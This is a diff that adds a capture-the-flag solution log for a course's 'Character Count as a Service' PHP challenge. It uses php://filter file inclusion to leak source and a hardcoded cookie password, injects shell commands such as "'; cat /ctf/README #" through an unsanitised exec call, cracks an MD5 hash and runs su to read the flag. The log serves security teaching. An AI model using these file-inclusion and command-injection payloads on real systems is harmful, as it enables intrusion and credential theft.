@@ -1,0 +1,87 @@
+$ http://10.0.118.48:30302/?file=wc.php
+$ http://10.0.118.48:30302/robots.txt
+> Disallow: /?file=checkpass.php
+
+$ http://10.0.118.48:30302/?file=php://filter/convert.base64-encode/resource=checkpass.php
+> PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiV0FSTklORyEgVGhlIHBhZ2UgaXMgdW5kZXIgZGV2ZWxvcG1lbnQuIFRoaXMgaGFzIGEgc2VjcmV0LCBkbyBub3QgY29tbWl0IHRoaXMgcGFnZS4iOwoKaGVhZGVyKCdMb2NhdGlvbjogLycpOwo
+```
+<?php
+$password = "w0rdc0unt123";
+// Cookie password.
+echo "WARNING! The page is under development. This has a secret, do not commit this page.";
+
+header('Location: /');
+```
+
+$ Use the cookie password=w0rdc0unt123 and reload the page to access the character count service.
+
+$ http://10.0.118.48:30302/?file=php://filter/convert.base64-encode/resource=wc.php
+> PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KICAgIDx0aXRsZT53YyBhcyBhIHNlcnZpY2U8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGh0bWwsCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG92ZXJmbG93OiBub25lOwogICAgICAgICAgICBtYXgtaGVpZ2h0OiAxMDB2aDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBzdHlsZT0iaGVpZ2h0OiAxMDB2aDsgdGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsiPgogICAgPD9waHAKICAgIGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDUpOwogICAgaWYgKCRfQ09PS0lFWydwYXNzd29yZCddICE9PSBnZXRlbnYoJ1BBU1NXT1JEJykpIHsKICAgICAgICBzZXRjb29raWUoJ3Bhc3N3b3JkJywgJ1BBU1NXT1JEJyk7CiAgICAgICAgZGllKCdTb3JyeSwgb25seSBwZW9wbGUgZnJvbSBpaXRnbiBjbnMgY291cnNlIGFyZSBhbGxvd2VkIHRvIGFjY2VzcyB0aGlzIHBhZ2UuJyk7CiAgICB9CiAgICA/PgoKICAgIDxoMT5DaGFyYWN0ZXIgQ291bnQgYXMgYSBTZXJ2aWNlPC9oMT4KICAgIDxmb3JtPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIHZhbHVlPSJ3Yy5waHAiIG5hbWU9ImZpbGUiPgogICAgICAgIDx0ZXh0YXJlYSBzdHlsZT0iYm9yZGVyLXJhZGl1czogMXJlbTsiIHR5cGU9InRleHQiIG5hbWU9InRleHQiIHJvd3M9MzAgY29scz0xMDA+PC90ZXh0YXJlYT48YnIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0Ij4KICAgIDwvZm9ybT4KICAgIDw/cGhwCiAgICBpZiAoaXNzZXQoJF9HRVRbInRleHQiXSkpIHsKICAgICAgICAkdGV4dCA9ICRfR0VUWyJ0ZXh0Il07CiAgICAgICAgZWNobyAiPGgyPlRoZSBDaGFyYWN0ZXIgQ291bnQgaXM6ICIgLiBleGVjKCdwcmludGYgXCcnIC4gJHRleHQgLiAnXCcgfCB3YyAtYycpIC4gIjwvaDI+IjsKICAgIH0KICAgID8+CjwvYm9keT4KCjwvaHRtbD4K
+```
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>wc as a service</title>
+    <style>
+        html,
+        body {
+            overflow: none;
+            max-height: 100vh;
+        }
+    </style>
+</head>
+
+<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
+    <?php
+    ini_set('max_execution_time', 5);
+    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
+        setcookie('password', 'PASSWORD');
+        die('Sorry, only people from iitgn cns course are allowed to access this page.');
+    }
+    ?>
+
+    <h1>Character Count as a Service</h1>
+    <form>
+        <input type="hidden" value="wc.php" name="file">
+        <textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100></textarea><br />
+        <input type="submit">
+    </form>
+    <?php
+    if (isset($_GET["text"])) {
+        $text = $_GET["text"];
+        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
+    }
+    ?>
+</body>
+
+</html>
+```
+
+$ '; ls #
+> The Character Count is: wc.php
+
+$ '; find / -name flag.txt #
+> The Character Count is: /ctf/system/of/a/down/flag.txt
+
+$ '; cat /ctf/system/of/a/down/flag.txt #
+> The Character Count is: (<empty>)
+
+$ '; ls /ctf #
+> The Character Count is: system
+
+$ '; ls -r /ctf #
+> The Character Count is: README
+
+$ '; cat /ctf/README #
+> The Character Count is: My password hash is 07e6b9849342c7e354bc9a90889af19e.
+
+$ https://crackstation.net/
+> Hash	                           Type	   Result
+07e6b9849342c7e354bc9a90889af19e	md5	   cnsctf
+
+$ '; echo cnsctf | su ctf -c "cat /ctf/system/of/a/down/flag.txt" #
+> The Character Count is: dL@stCTF431{1nj3ct10n_15_p41nfu1}
